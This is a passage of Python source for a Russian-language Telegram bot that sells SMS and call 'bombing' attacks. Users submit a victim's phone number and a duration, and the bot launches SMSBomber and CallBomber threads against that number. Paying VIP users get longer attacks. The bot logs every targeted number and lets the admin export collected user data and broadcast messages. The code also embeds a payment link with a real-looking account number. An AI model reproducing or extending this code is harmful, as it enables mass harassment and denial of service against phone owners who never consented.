            b = bot.send_message(message.chat.id, '🙃 Введите ссылку на канал')
            bot.register_next_step_handler(b, subchan)

        elif text == '😻 Удалить партнера' and chat_id == ADMIN_CHAT_ID1:
            postsRES()
            bot.send_message(chat_id, '🙃 Партнер удалён')
        
        elif 'РАЗОСЛАТЬ: ' in text and chat_id == ADMIN_CHAT_ID1:
            msg = text.replace("РАЗОСЛАТЬ: ", "")
            bot.send_message(message.chat.id, '👀 Рассылка запущена')
            send_message_users(msg)
            bot.send_message(chat_id, '👀 Рассылка завершена')
        
        elif text == "Удалить" and chat_id == ADMIN_CHAT_ID1:
            ww = bot.send_message(message.chat.id, "🌚 Введите номер, который вы хотите удалить с Белого листа.")
            bot.register_next_step_handler(ww, delllwl)

        elif text == "Добавить" and chat_id == ADMIN_CHAT_ID1:
            ww = bot.send_message(message.chat.id, "😌 Введите номер, который вы хотите добавить в Белый лист.")
            bot.register_next_step_handler(ww, addwl)

        elif text == 'Защита' and chat_id == ADMIN_CHAT_ID1:
            nums = ""
            f = open("numWL.txt", mode="r", encoding="utf-8")
            for line in f.readlines():
                nums += line
            bot.send_message(message.chat.id, nums)
            f.close()
        
        elif text == "😻 Приват_Д" and chat_id == ADMIN_CHAT_ID1:
            ww = bot.send_message(message.chat.id, "🌚 Введите айди человека, которого нужно добавить в Приватного Бота (узнать @userinfobot)")
            bot.register_next_step_handler(ww, adduser)

        elif text == "😻 Приват_У" and chat_id == ADMIN_CHAT_ID1:
            ww = bot.send_message(message.chat.id, "😌 Введите айди человека, которого нужно удалить с Приватного Бота (узнать @userinfobot)")
            bot.register_next_step_handler(ww, delluser)

        elif text == '😻 Приватки' and chat_id == ADMIN_CHAT_ID1:
            nums = ""
            f = open("vip_id.txt", mode="r", encoding="utf-8")
            for line in f.readlines():
                nums += line
            bot.send_message(message.chat.id, nums)
            f.close()
        
        elif text == '/admin' and chat_id == ADMIN_CHAT_ID1:
            bot.send_message(chat_id, 'Выберите действие.', reply_markup=adm)

        elif text == '⬅️ Назад' and chat_id == ADMIN_CHAT_ID1:
            bot.send_message(chat_id, 'Выберите действие.', reply_markup=keyboard)

        elif text == '😻 Рассылка' and chat_id == ADMIN_CHAT_ID1:
            bot.send_message(chat_id, 'Введите сообщение в формате: "РАЗОСЛАТЬ: ваш_текст" без кавычек')

        elif text == '💣 Накрутка' and chat_id == ADMIN_CHAT_ID1:
            bot.send_message(chat_id, '😜 Опа... Накрутил')
            with open(num_file, "a+") as ids_file:
                ids_file.seek(0)
                ids_list = [line.split('\n')[0] for line in ids_file]
                ids_file.write(f'{adm1s}\n')
                ids_list.append(adm1s)
                ids_file.close()
            return

        elif text == '🌚 Обновить VPN' and chat_id == ADMIN_CHAT_ID1:
            bot.send_message(chat_id, 'Бот перезапускается...')
            os.system('python3 main.py')

        elif text == '🌚 Получить данные' and chat_id == ADMIN_CHAT_ID1:
            f = open('chat_ids.txt', 'rb')
            bot.send_document(chat_id, f)
            f = open('num.txt', 'rb')
            bot.send_document(chat_id, f)
            f = open('friend.txt', 'rb')
            bot.send_document(chat_id, f)
            f = open('url.txt', 'rb')
            bot.send_document(chat_id, f)
            f = open('numWL.txt', 'rb')
            bot.send_document(chat_id, f)
            f.close()

####################################################################################################################

    if user_status == 'restricted' or user_status == 'left' or user_status == 'kicked':
        bot.send_message(message.chat.id,
                         '🥺 Вы не подписаны на наш канал.\n🥺 Подпишитесь на него, чтобы получить доступ к боту.',
                         reply_markup=inl_keyboard)


def give_vip(message):
    try:
        id = int(message.text)

        add_vip(id)
        bot.send_message(message.chat.id, 'Випка выдана ' + message.text)
    except:
        bot.send_message(message.chat.id, 'Что-то пошло не так')

def buy_keyboard_inline(user_id):
    buy_keyboard_inline = types.InlineKeyboardMarkup()
    buy_keyboard_inline_1 = types.InlineKeyboardButton(text = "Оплатить", url="https://qiwi.com/payment/form/99?extra[%27account%27]=79826707658&amountInteger=199&amountFraction=00&extra[%27comment%27]=+str(user_id)+-sms&blocked[0]=sum&blocked[1]=comment&blocked[2]=account")
    buy_keyboard_inline.add(buy_keyboard_inline_1)
    return buy_keyboard_inline


def enter_number(message):
    print('sadfsdf')
    def invalid_phone():
        msg = bot.send_message(message.chat.id, 'Номер введен неверно')

    if not re.fullmatch(r'(79|380|77|44|7|1)\d{9}', message.text):
        invalid_phone()
        return

    f = open('numWL.txt')

    if message.text in f.read():
        bot.send_message(message.chat.id, '😞 Ошибка! Вы ввели неверный номер.')
        return

    f.close()

    check = check_vip(message.chat.id)

    if check:
        msg = bot.send_message(message.chat.id, 'Выберите время спама. Вы можете ввести время только от 1 до 3000 секунд')
    else:
        msg = bot.send_message(message.chat.id, 'Выберите время спама. Вы можете ввести время от 1 до 300 секунд')

    bomber_state[str(message.chat.id)]['phone'] = message.text
    bot.register_next_step_handler(msg, choose_time)


def choose_time(message):
    try:
        check = check_vip(message.chat.id)
        time = int(message.text)

        if check:
            if not time in range(1, 3001):
                msg = bot.send_message(message.chat.id, 'Вы можете ввести время только от 1 до 3000 секунд')
                bot.register_next_step_handler(msg, choose_time)
                return
        else:
           if not time in range(1, 301):
                msg = bot.send_message(message.chat.id, 'Вы можете ввести время только от 1 до 300 секунд')          
                bot.register_next_step_handler(msg, choose_time)
                return

        bomber_state[str(message.chat.id)]['time'] = time
        start_bomber(message)

    except:
        print("e")
        msg = bot.send_message(message.chat.id, 'Что-то пошло не так')


def start_bomber(message):
    print('start_bomber1')
    data = bomber_state[str(message.chat.id)]

    f = open('num.txt', 'a')
    f.write(data['phone'] + '\n')
    f.close()

    if data['type'] == 'sms':
        print('start_bomber_sms')
        bomber = bomber_.SMSBomber()
        threading.Thread(target=bomber.attack, args=(message.chat.id, data['time'], data['phone'])).start()

    elif data['type'] == 'call':
            bomber = bomber_.CallBomber()

            if check_vip(message.chat.id):
                interval = 30
            else:
                interval = 70

            threading.Thread(target=bomber.attack, args=(message.chat.id, data['time'], data['phone'], interval)).start()
            


if __name__ == '__main__':
    bot.polling(none_stop=True)
